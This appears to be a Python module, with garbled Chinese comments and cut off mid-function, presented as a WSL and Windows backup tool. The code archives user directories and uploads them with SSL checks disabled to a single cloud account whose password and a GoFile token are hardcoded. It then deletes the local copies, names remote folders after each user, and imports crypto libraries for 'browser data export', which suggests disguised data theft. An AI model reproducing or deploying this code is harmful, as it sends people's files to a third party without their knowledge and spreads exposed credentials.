# -*- coding: utf-8 -*-
"""
è‡ªåŠ¨å¤‡ä»½å’Œä¸Šä¼ å·¥å…·
åŠŸèƒ½ï¼šå¤‡ä»½WSLå’ŒWindowsç³»ç»Ÿä¸­çš„é‡è¦æ–‡ä»¶ï¼Œå¹¶è‡ªåŠ¨ä¸Šä¼ åˆ°äº‘å­˜å‚¨
"""

# å…ˆå¯¼å…¥æ ‡å‡†åº“
import os
import sys
import shutil
import time
import socket
import logging
import platform
import tarfile
import threading
import subprocess
import base64
import getpass
import json
import sqlite3
from datetime import datetime, timedelta
from pathlib import Path
from functools import lru_cache

import_failed = False
try:
    import requests
    from requests.auth import HTTPBasicAuth
except ImportError as e:
    print(f"âš  è­¦å‘Š: æ— æ³•å¯¼å…¥ requests åº“: {str(e)}")
    requests = None
    HTTPBasicAuth = None
    import_failed = True

try:
    import urllib3
    # ç¦ç”¨SSLè­¦å‘Š
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError as e:
    print(f"âš  è­¦å‘Š: æ— æ³•å¯¼å…¥ urllib3 åº“: {str(e)}")
    urllib3 = None
    import_failed = True

if import_failed:
    print("âš  è­¦å‘Š: éƒ¨åˆ†ä¾èµ–å¯¼å…¥å¤±è´¥ï¼Œç¨‹åºå°†ç»§ç»­è¿è¡Œï¼Œä½†ç›¸å…³åŠŸèƒ½å¯èƒ½ä¸å¯ç”¨")

# å°è¯•å¯¼å…¥æµè§ˆå™¨æ•°æ®å¯¼å‡ºæ‰€éœ€çš„åº“
BROWSER_EXPORT_AVAILABLE = False
try:
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Random import get_random_bytes
    BROWSER_EXPORT_AVAILABLE = True
except ImportError:
    pass  # æ—¥å¿—å°†åœ¨ CLI ä¸­é…ç½®

from .config import BackupConfig

class BackupManager:
    """å¤‡ä»½ç®¡ç†å™¨ç±»"""
    
    def __init__(self):
        """åˆå§‹åŒ–å¤‡ä»½ç®¡ç†å™¨"""
        self.config = BackupConfig()
        
        # Infini Cloud é…ç½®
        self.infini_url = "https://wajima.infini-cloud.net/dav/"
        self.infini_user = "messiahxp"
        self.infini_pass = "U5tzgpQeTVr4j5T7"
        
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        self.config.INFINI_REMOTE_BASE_DIR = f"{user_prefix}_wsl_backup"
        
        # é…ç½® requests session ç”¨äºä¸Šä¼ 
        self.session = requests.Session()
        self.session.verify = False  # ç¦ç”¨SSLéªŒè¯
        self.auth = HTTPBasicAuth(self.infini_user, self.infini_pass)
        
        # GoFile API tokenï¼ˆå¤‡é€‰æ–¹æ¡ˆï¼‰
        self.api_token = "qSS40ZpgNXq7zZXzy4QDSX3z9yCVCXJu"
        
        self._setup_logging()

    def _setup_logging(self):
        """é…ç½®æ—¥å¿—ç³»ç»Ÿ"""
        try:
            # ç¡®ä¿æ—¥å¿—ç›®å½•å­˜åœ¨
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, exist_ok=True)
            
            # é…ç½®æ–‡ä»¶å¤„ç†å™¨
            file_handler = logging.FileHandler(
                self.config.LOG_FILE, 
                encoding='utf-8'
            )
            file_handler.setFormatter(
                logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
            )
            
            # é…ç½®æ§åˆ¶å°å¤„ç†å™¨
            console_handler = logging.StreamHandler()
            console_handler.setFormatter(logging.Formatter('%(message)s'))
            
            # é…ç½®æ ¹æ—¥å¿—è®°å½•å™¨
            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )
            
            # æ¸…é™¤ç°æœ‰å¤„ç†å™¨
            root_logger.handlers.clear()
            
            # æ·»åŠ å¤„ç†å™¨
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
            
            logging.info("æ—¥å¿—ç³»ç»Ÿåˆå§‹åŒ–å®Œæˆ")
        except Exception as e:
            print(f"è®¾ç½®æ—¥å¿—ç³»ç»Ÿæ—¶å‡ºé”™: {e}")

    @staticmethod
    def _get_dir_size(directory):
        """è·å–ç›®å½•æ€»å¤§å°
        
        Args:
            directory: ç›®å½•è·¯å¾„
            
        Returns:
            int: ç›®å½•å¤§å°ï¼ˆå­—èŠ‚ï¼‰
        """
        total_size = 0
        for dirpath, _, filenames in os.walk(directory):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    total_size += os.path.getsize(file_path)
                except (OSError, IOError) as e:
                    logging.error(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
        return total_size

    @staticmethod
    def _ensure_directory(directory_path):
        """ç¡®ä¿ç›®å½•å­˜åœ¨
        
        Args:
            directory_path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: ç›®å½•æ˜¯å¦å¯ç”¨
        """
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"âŒ è·¯å¾„å­˜åœ¨ä½†ä¸æ˜¯ç›®å½•: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"âŒç›®å½•æ²¡æœ‰å†™å…¥æƒé™: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, exist_ok=True)
            return True
        except Exception as e:
            logging.error(f"âŒ åˆ›å»ºç›®å½•å¤±è´¥ {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        """æ¸…ç†å¹¶é‡æ–°åˆ›å»ºç›®å½•
        
        Args:
            directory_path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: æ“ä½œæ˜¯å¦æˆåŠŸ
        """
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path, ignore_errors=True)
            return BackupManager._ensure_directory(directory_path)
        except Exception as e:
            logging.error(f"âŒ æ¸…ç†ç›®å½•å¤±è´¥ {directory_path}: {e}")
            return False

    @staticmethod
    def _check_internet_connection():
        """æ£€æŸ¥ç½‘ç»œè¿æ¥
        
        Returns:
            bool: æ˜¯å¦æœ‰ç½‘ç»œè¿æ¥
        """
        try:
            # å°è¯•è¿æ¥å¤šä¸ªå¯é çš„æœåŠ¡å™¨
            hosts = [
                "8.8.8.8",  # Google DNS
                "1.1.1.1",  # Cloudflare DNS
                "208.67.222.222"  # OpenDNS
            ]
            for host in hosts:
                try:
                    socket.create_connection((host, 53), timeout=BackupConfig.NETWORK_CONNECTION_TIMEOUT)
                    return True
                except:
                    continue
            return False
        except:
            return False

    @staticmethod
    def _is_valid_file(file_path):
        """æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æœ‰æ•ˆ
        
        Args:
            file_path: æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: æ–‡ä»¶æ˜¯å¦æœ‰æ•ˆ
        """
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    def backup_wsl_files(self, source_dir, target_dir):
        """WSLç¯å¢ƒæ–‡ä»¶å¤‡ä»½"""
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if not os.path.exists(source_dir):
            logging.error("âŒ WSLæºç›®å½•ä¸å­˜åœ¨")
            return None

        # è·å–ç”¨æˆ·åå‰ç¼€
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"

        # åˆ›å»ºå­ç›®å½•ç”¨äºå­˜æ”¾æŒ‡å®šæ–‡ä»¶
        target_specified = os.path.join(target_dir, f"{user_prefix}_specified")
        
        if not self._clean_directory(target_dir):
            return None
            
        if not self._ensure_directory(target_specified):
            return None

        # æ·»åŠ è®¡æ•°å™¨å’Œè¶…æ—¶æ§åˆ¶
        start_time = time.time()
        last_progress_time = start_time
        timeout = self.config.WSL_BACKUP_TIMEOUT
        processed_files = 0

        # è¾“å‡ºå¼€å§‹å¤‡ä»½çš„ä¿¡æ¯
        logging.info("\n" + "â”€" * 50)
        logging.info("ğŸš€ å¼€å§‹å¤‡ä»½ WSL é‡è¦ç›®å½•å’Œæ–‡ä»¶")
        logging.info("â”€" * 50 + "\n")

        # å¤„ç†æŒ‡å®šç›®å½•å’Œæ–‡ä»¶ï¼ˆå®Œæ•´å¤‡ä»½ï¼Œä¸ç­›é€‰æ‰©å±•åï¼‰
        for specific_path in self.config.WSL_SPECIFIC_DIRS:
            # æ£€æŸ¥æ˜¯å¦è¶…æ—¶
            if time.time() - start_time > timeout:
                logging.error("\nâŒ WSLå¤‡ä»½è¶…æ—¶")
                return None

            full_source_path = os.path.join(source_dir, specific_path)
            if os.path.exists(full_source_path):
                try:
                    # å¯¹äºæŒ‡å®šçš„ç›®å½•å’Œæ–‡ä»¶ï¼Œä¿å­˜åœ¨ specified ç›®å½•ä¸‹
                    target_base_for_specific = target_specified
                    if os.path.isfile(full_source_path):
                        # å¦‚æœæ˜¯æ–‡ä»¶ï¼Œç›´æ¥å¤åˆ¶
                        target_file = os.path.join(target_base_for_specific, specific_path)
                        target_file_dir = os.path.dirname(target_file)
                        if self._ensure_directory(target_file_dir):
                            shutil.copy2(full_source_path, target_file)
                            processed_files += 1
                            if self.config.DEBUG_MODE:
                                logging.info(f"ğŸ“„ å·²å¤‡ä»½: {specific_path}")
                    else:
                        # å¦‚æœæ˜¯ç›®å½•ï¼Œé€’å½’å¤åˆ¶å…¨éƒ¨å†…å®¹
                        target_path = os.path.join(target_base_for_specific, specific_path)
                        if self._ensure_directory(os.path.dirname(target_path)):
                            if os.path.exists(target_path):
                                shutil.rmtree(target_path)
                            
                            # æ·»åŠ ç›®å½•å¤åˆ¶è¿›åº¦æ—¥å¿—
                            logging.info(f"\nğŸ“ æ­£åœ¨å¤‡ä»½: {specific_path}/")
                            shutil.copytree(full_source_path, target_path, symlinks=True)
                except Exception as e:
                    logging.error(f"\nâŒ å¤‡ä»½å¤±è´¥: {specific_path} - {str(e)}")

        # è®¡ç®—æ€»ç”¨æ—¶
        total_time = time.time() - start_time
        total_minutes = int(total_time / 60)

        if processed_files > 0:
            logging.info("\n" + "â•" * 50)
            logging.info("ğŸ“Š WSLå¤‡ä»½ç»Ÿè®¡")
            logging.info("â•" * 50)
            logging.info(f"   ğŸ”„ æ€»è®¡å¤„ç†ï¼š{processed_files} ä¸ªæ–‡ä»¶")
            logging.info(f"   â±ï¸  æ€»å…±è€—æ—¶ï¼š{total_minutes} åˆ†é’Ÿ")
            logging.info("â•" * 50 + "\n")

        return target_dir

    def split_large_file(self, file_path):
        """å°†å¤§æ–‡ä»¶åˆ†å‰²æˆå°å—
        
        Args:
            file_path: è¦åˆ†å‰²çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            list: åˆ†ç‰‡æ–‡ä»¶è·¯å¾„åˆ—è¡¨ï¼Œå¦‚æœä¸éœ€è¦åˆ†å‰²åˆ™è¿”å›None
        """
        if not os.path.exists(file_path):
            return None
        
        file_size = os.path.getsize(file_path)
        if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
            return None
        
        try:
            chunk_files = []
            chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
            if not self._ensure_directory(chunk_dir):
                return None
            
            base_name = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk_data = f.read(self.config.CHUNK_SIZE)
                    if not chunk_data:
                        break
                    
                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk_data)
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                
            logging.critical(f"æ–‡ä»¶ {file_path} å·²åˆ†å‰²ä¸º {len(chunk_files)} ä¸ªåˆ†ç‰‡")
            return chunk_files
        except (OSError, IOError) as e:
            logging.error(f"åˆ†å‰²æ–‡ä»¶å¤±è´¥ {file_path}: {e}")
            return None

    def upload_file(self, file_path):
        """ä¸Šä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if not self._is_valid_file(file_path):
            logging.error(f"âš ï¸ æ–‡ä»¶ {file_path} ä¸ºç©ºæˆ–æ— æ•ˆï¼Œè·³è¿‡ä¸Šä¼ ")
            return False

        # æ£€æŸ¥æ–‡ä»¶å¤§å°å¹¶åœ¨éœ€è¦æ—¶åˆ†ç‰‡
        chunk_files = self.split_large_file(file_path)
        if chunk_files:
            success = True
            for chunk_file in chunk_files:
                if not self._upload_single_file(chunk_file):
                    success = False
            # ä»…åœ¨å…¨éƒ¨åˆ†ç‰‡ä¸Šä¼ æˆåŠŸåæ¸…ç†åˆ†ç‰‡ç›®å½•ä¸åŸå§‹æ–‡ä»¶
            if success:
                chunk_dir = os.path.dirname(chunk_files[0])
                self._clean_directory(chunk_dir)
                if os.path.exists(file_path):
                    try:
                        os.remove(file_path)
                    except Exception:
                        pass
            return success
        else:
            return self._upload_single_file(file_path)

    def _create_remote_directory(self, remote_dir):
        """åˆ›å»ºè¿œç¨‹ç›®å½•ï¼ˆä½¿ç”¨ WebDAV MKCOL æ–¹æ³•ï¼‰"""
        if not remote_dir or remote_dir == '.':
            return True
        
        try:
            # æ„å»ºç›®å½•è·¯å¾„
            dir_path = f"{self.infini_url.rstrip('/')}/{remote_dir.lstrip('/')}"
            
            response = self.session.request('MKCOL', dir_path, auth=self.auth, timeout=(8, 8))
            
            if response.status_code in [201, 204, 405]:  # 405 è¡¨ç¤ºå·²å­˜åœ¨
                return True
            elif response.status_code == 409:
                # 409 å¯èƒ½è¡¨ç¤ºçˆ¶ç›®å½•ä¸å­˜åœ¨ï¼Œå°è¯•åˆ›å»ºçˆ¶ç›®å½•
                parent_dir = os.path.dirname(remote_dir)
                if parent_dir and parent_dir != '.':
                    if self._create_remote_directory(parent_dir):
                        # çˆ¶ç›®å½•åˆ›å»ºæˆåŠŸï¼Œå†æ¬¡å°è¯•åˆ›å»ºå½“å‰ç›®å½•
                        response = self.session.request('MKCOL', dir_path, auth=self.auth, timeout=(8, 8))
                        return response.status_code in [201, 204, 405]
                return False
            else:
                return False
        except Exception:
            return False

    def _upload_single_file_infini(self, file_path):
        """ä¸Šä¼ å•ä¸ªæ–‡ä»¶åˆ° Infini Cloudï¼ˆä½¿ç”¨ WebDAV PUT æ–¹æ³•ï¼‰"""
        try:
            # æ£€æŸ¥æ–‡ä»¶æƒé™å’ŒçŠ¶æ€
            if not os.path.exists(file_path):
                logging.error(f"æ–‡ä»¶ä¸å­˜åœ¨: {file_path}")
                return False
                
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"æ–‡ä»¶å¤§å°ä¸º0: {file_path}")
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"æ–‡ä»¶è¿‡å¤§ {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            # æ„å»ºè¿œç¨‹è·¯å¾„
            filename = os.path.basename(file_path)
            remote_filename = f"{self.config.INFINI_REMOTE_BASE_DIR}/{filename}"
            remote_path = f"{self.infini_url.rstrip('/')}/{remote_filename.lstrip('/')}"
            
            # åˆ›å»ºè¿œç¨‹ç›®å½•ï¼ˆå¦‚æœéœ€è¦ï¼‰
            remote_dir = os.path.dirname(remote_filename)
            if remote_dir and remote_dir != '.':
                if not self._create_remote_directory(remote_dir):
                    logging.warning(f"æ— æ³•åˆ›å»ºè¿œç¨‹ç›®å½•: {remote_dir}ï¼Œå°†ç»§ç»­å°è¯•ä¸Šä¼ ")

            # ä¸Šä¼ é‡è¯•é€»è¾‘
            for attempt in range(self.config.RETRY_COUNT):
                if not self._check_internet_connection():
                    logging.error("ç½‘ç»œè¿æ¥ä¸å¯ç”¨ï¼Œç­‰å¾…é‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY)
                    continue

                try:
                    # æ ¹æ®æ–‡ä»¶å¤§å°åŠ¨æ€è°ƒæ•´è¶…æ—¶æ—¶é—´
                    if file_size < 1024 * 1024:  # å°äº1MB
                        connect_timeout = 10
                        read_timeout = 30
                    elif file_size < 10 * 1024 * 1024:  # 1-10MB
                        connect_timeout = 15
                        read_timeout = max(30, int(file_size / 1024 / 1024 * 5))
                    else:  # å¤§äº10MB
                        connect_timeout = 20
                        read_timeout = max(60, int(file_size / 1024 / 1024 * 6))
                    
                    # åªåœ¨ç¬¬ä¸€æ¬¡å°è¯•æ—¶æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯
                    if attempt == 0:
                        size_str = f"{file_size / 1024 / 1024:.2f}MB" if file_size >= 1024 * 1024 else f"{file_size / 1024:.2f}KB"
                        logging.critical(f"ğŸ“¤ [Infini Cloud] ä¸Šä¼ : {filename} ({size_str})")
                    elif self.config.DEBUG_MODE:
                        logging.debug(f"[Infini Cloud] é‡è¯•ä¸Šä¼ : {filename} (ç¬¬ {attempt + 1} æ¬¡)")
                    
                    # å‡†å¤‡è¯·æ±‚å¤´
                    headers = {
                        'Content-Type': 'application/octet-stream',
                        'Content-Length': str(file_size),
                    }
                    
                    # æ‰§è¡Œä¸Šä¼ ï¼ˆä½¿ç”¨ WebDAV PUT æ–¹æ³•ï¼‰
                    with open(file_path, 'rb') as f:
                        response = self.session.put(
                            remote_path,
                            data=f,
                            headers=headers,
                            auth=self.auth,
                            timeout=(connect_timeout, read_timeout),
                            stream=False
                        )
                    
                    if response.status_code in [201, 204]:
                        logging.critical(f"âœ… [Infini Cloud] {filename}")
                        return True
                    elif response.status_code == 403:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [Infini Cloud] {filename}: æƒé™ä¸è¶³")
                    elif response.status_code == 404:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [Infini Cloud] {filename}: è¿œç¨‹è·¯å¾„ä¸å­˜åœ¨")
                    elif response.status_code == 409:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [Infini Cloud] {filename}: è¿œç¨‹è·¯å¾„å†²çª")
                    else:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [Infini Cloud] {filename}: çŠ¶æ€ç  {response.status_code}")
                        
                except requests.exceptions.Timeout:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [Infini Cloud] {os.path.basename(file_path)}: è¶…æ—¶")
                except requests.exceptions.SSLError as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [Infini Cloud] {os.path.basename(file_path)}: SSLé”™è¯¯")
                except requests.exceptions.ConnectionError as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [Infini Cloud] {os.path.basename(file_path)}: è¿æ¥é”™è¯¯")
                except Exception as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [Infini Cloud] {os.path.basename(file_path)}: {str(e)}")

                if attempt < self.config.RETRY_COUNT - 1:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"ç­‰å¾… {self.config.RETRY_DELAY} ç§’åé‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY)

            return False
            
        except OSError as e:
            logging.error(f"è·å–æ–‡ä»¶ä¿¡æ¯å¤±è´¥ {file_path}: {e}")
            return False
        except Exception as e:
            logging.error(f"[Infini Cloud] ä¸Šä¼ è¿‡ç¨‹å‡ºé”™: {e}")
            return False

    def _upload_single_file_gofile(self, file_path):
        """ä¸Šä¼ å•ä¸ªæ–‡ä»¶åˆ° GoFileï¼ˆå¤‡é€‰æ–¹æ¡ˆï¼‰
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"æ–‡ä»¶å¤§å°ä¸º0 {file_path}")
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"âš ï¸ æ–‡ä»¶è¿‡å¤§ {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            filename = os.path.basename(file_path)
            logging.info(f"ğŸ”„ å°è¯•ä½¿ç”¨ GoFile ä¸Šä¼ : {filename}")

            for attempt in range(self.config.RETRY_COUNT):
                # æ£€æŸ¥ç½‘ç»œè¿æ¥
                if not self._check_internet_connection():
                    logging.error("âš ï¸ ç½‘ç»œè¿æ¥ä¸å¯ç”¨ï¼Œç­‰å¾…é‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY * 2)  # ç½‘ç»œé—®é¢˜æ—¶ç­‰å¾…æ›´é•¿æ—¶é—´
                    continue

                for server in self.config.UPLOAD_SERVERS:
                    try:
                        with open(file_path, "rb") as f:
                            if attempt == 0:
                                logging.critical(f"âŒ› [GoFile] æ­£åœ¨ä¸Šä¼ æ–‡ä»¶ {filename}ï¼ˆ{file_size / 1024 / 1024:.2f}MBï¼‰ï¼Œä½¿ç”¨æœåŠ¡å™¨ {server}...")
                            elif self.config.DEBUG_MODE:
                                logging.debug(f"[GoFile] ç¬¬ {attempt + 1} æ¬¡å°è¯•ï¼Œä½¿ç”¨æœåŠ¡å™¨ {server}...")
                            
                            response = requests.post(
                                server,
                                files={"file": f},
                                data={"token": self.api_token},
                                timeout=self.config.UPLOAD_TIMEOUT,
                                verify=True
                            )
                            
                            if response.ok and response.headers.get("Content-Type", "").startswith("application/json"):
                                result = response.json()
                                if result.get("status") == "ok":
                                    logging.critical(f"âœ… [GoFile] {filename}")
                                    return True
                                else:
                                    error_msg = result.get("message", "æœªçŸ¥é”™è¯¯")
                                    if attempt == 0 or self.config.DEBUG_MODE:
                                        logging.error(f"âŒ [GoFile] æœåŠ¡å™¨è¿”å›é”™è¯¯: {error_msg}")
                            else:
                                if attempt == 0 or self.config.DEBUG_MODE:
                                    logging.error(f"âŒ [GoFile] ä¸Šä¼ å¤±è´¥ï¼ŒçŠ¶æ€ç : {response.status_code}")
                                
                    except requests.exceptions.Timeout:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [GoFile] {filename}: ä¸Šä¼ è¶…æ—¶")
                    except requests.exceptions.SSLError:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [GoFile] {filename}: SSLé”™è¯¯")
                    except requests.exceptions.ConnectionError:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [GoFile] {filename}: è¿æ¥é”™è¯¯")
                    except Exception as e:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [GoFile] {filename}: {str(e)}")
                    
                    # å¦‚æœè¿™ä¸ªæœåŠ¡å™¨å¤±è´¥ï¼Œç»§ç»­å°è¯•ä¸‹ä¸€ä¸ªæœåŠ¡å™¨
                    continue
                
                if attempt < self.config.RETRY_COUNT - 1:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"ç­‰å¾… {self.config.RETRY_DELAY} ç§’åé‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY)
            
            logging.error(f"âŒ [GoFile] {filename}: ä¸Šä¼ å¤±è´¥ï¼Œå·²è¾¾åˆ°æœ€å¤§é‡è¯•æ¬¡æ•°")
            return False
            
        except OSError as e:
            logging.error(f"âŒ è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
            return False
        except Exception as e:
            logging.error(f"[GoFile] ä¸Šä¼ è¿‡ç¨‹å‡ºé”™: {e}")
            return False

    def _upload_single_file(self, file_path):
        """ä¸Šä¼ å•ä¸ªæ–‡ä»¶ï¼Œä¼˜å…ˆä½¿ç”¨ Infini Cloudï¼Œå¤±è´¥åˆ™ä½¿ç”¨ GoFile å¤‡é€‰æ–¹æ¡ˆ
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"æ–‡ä»¶å¤§å°ä¸º0 {file_path}")
                if os.path.exists(file_path):
                    os.remove(file_path)
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"âš ï¸ æ–‡ä»¶è¿‡å¤§ {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                if os.path.exists(file_path):
                    os.remove(file_path)
                return False

            # ä¼˜å…ˆå°è¯• Infini Cloud ä¸Šä¼ 
            if self._upload_single_file_infini(file_path):
                if os.path.exists(file_path):
                    os.remove(file_path)
                return True

            # Infini Cloud ä¸Šä¼ å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨ GoFile å¤‡é€‰æ–¹æ¡ˆ
            logging.warning(f"âš ï¸ Infini Cloud ä¸Šä¼ å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨ GoFile å¤‡é€‰æ–¹æ¡ˆ: {os.path.basename(file_path)}")
            if self._upload_single_file_gofile(file_path):
                if os.path.exists(file_path):
                    os.remove(file_path)
                return True
            
            # ä¸¤ä¸ªæ–¹æ³•éƒ½å¤±è´¥
            logging.error(f"âŒ {os.path.basename(file_path)}: æ‰€æœ‰ä¸Šä¼ æ–¹æ³•å‡å¤±è´¥")
            return False
            
        except OSError as e:
            logging.error(f"âŒ è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
            return False
        except Exception as e:
            logging.error(f"å¤„ç†æ–‡ä»¶æ—¶å‡ºç°æœªçŸ¥é”™è¯¯: {str(e)}")
            return False

    def zip_backup_folder(self, folder_path, zip_file_path):
        """å‹ç¼©å¤‡ä»½æ–‡ä»¶å¤¹ä¸ºtar.gzæ ¼å¼
        
        Args:
            folder_path: è¦å‹ç¼©çš„æ–‡ä»¶å¤¹è·¯å¾„
            zip_file_path: å‹ç¼©æ–‡ä»¶è·¯å¾„ï¼ˆä¸å«æ‰©å±•åï¼‰
            
        Returns:
            str or list: å‹ç¼©æ–‡ä»¶è·¯å¾„æˆ–å‹ç¼©æ–‡ä»¶è·¯å¾„åˆ—è¡¨
        """
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            # æ£€æŸ¥æºç›®å½•æ˜¯å¦ä¸ºç©º
            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
            if total_files == 0:
                logging.error(f"âš ï¸ æºç›®å½•ä¸ºç©º {folder_path}")
                return None

            # è®¡ç®—æºç›®å½•å¤§å°
            dir_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    try:
                        file_path = os.path.join(dirpath, filename)
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # è·³è¿‡ç©ºæ–‡ä»¶
                            dir_size += file_size
                    except OSError as e:
                        logging.error(f"âŒè·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
                        continue

            if dir_size == 0:
                logging.error(f"æºç›®å½•å®é™…å¤§å°ä¸º0 {folder_path}")
                return None

            if dir_size > self.config.MAX_SOURCE_DIR_SIZE:
                logging.error(f"âš ï¸ æºç›®å½•è¿‡å¤§ {folder_path}: {dir_size / 1024 / 1024 / 1024:.2f}GB > {self.config.MAX_SOURCE_DIR_SIZE / 1024 / 1024 / 1024}GB")
                return self.split_large_directory(folder_path, zip_file_path)

            tar_path = f"{zip_file_path}.tar.gz"
            if os.path.exists(tar_path):
                os.remove(tar_path)

            with tarfile.open(tar_path, "w:gz", compresslevel=self.config.TAR_COMPRESS_LEVEL) as tar:
                tar.add(folder_path, arcname=os.path.basename(folder_path))

            # éªŒè¯å‹ç¼©æ–‡ä»¶
            try:
                compressed_size = os.path.getsize(tar_path)
                if compressed_size == 0:
                    logging.error(f"å‹ç¼©æ–‡ä»¶å¤§å°ä¸º0 {tar_path}")
                    if os.path.exists(tar_path):
                        os.remove(tar_path)
                    return None
                    
                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                    os.remove(tar_path)
                    return self.split_large_directory(folder_path, zip_file_path)

                self._clean_directory(folder_path)
                logging.critical(f"ğŸ—‚ï¸ ç›®å½• {folder_path} ğŸ—ƒï¸ å·²å‹ç¼©: {dir_size / 1024 / 1024:.2f}MB -> {compressed_size / 1024 / 1024:.2f}MB")
                return tar_path
            except OSError as e:
                logging.error(f"âŒ è·å–å‹ç¼©æ–‡ä»¶å¤§å°å¤±è´¥ {tar_path}: {e}")
                if os.path.exists(tar_path):
                    os.remove(tar_path)
                return None
                
        except Exception as e:
            logging.error(f"âŒ å‹ç¼©å¤±è´¥ {folder_path}: {e}")
            return None

    def _compress_chunk_part(self, part_dir, folder_path, base_zip_path, part_num, chunk_size):
        """å‹ç¼©å•ä¸ªåˆ†å—ç›®å½•
        
        Args:
            part_dir: åˆ†å—ç›®å½•è·¯å¾„
            folder_path: åŸå§‹ç›®å½•è·¯å¾„ï¼ˆç”¨äºarcnameï¼‰
            base_zip_path: åŸºç¡€å‹ç¼©æ–‡ä»¶è·¯å¾„
            part_num: åˆ†å—ç¼–å·
            chunk_size: åˆ†å—å¤§å°ï¼ˆå­—èŠ‚ï¼‰
            
        Returns:
            str or None: å‹ç¼©æ–‡ä»¶è·¯å¾„ï¼Œå¤±è´¥è¿”å›None
        """
        tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
        try:
            with tarfile.open(tar_path, "w:gz", compresslevel=self.config.TAR_COMPRESS_LEVEL) as tar:
                tar.add(part_dir, arcname=os.path.basename(folder_path))
            
            # éªŒè¯å‹ç¼©æ–‡ä»¶
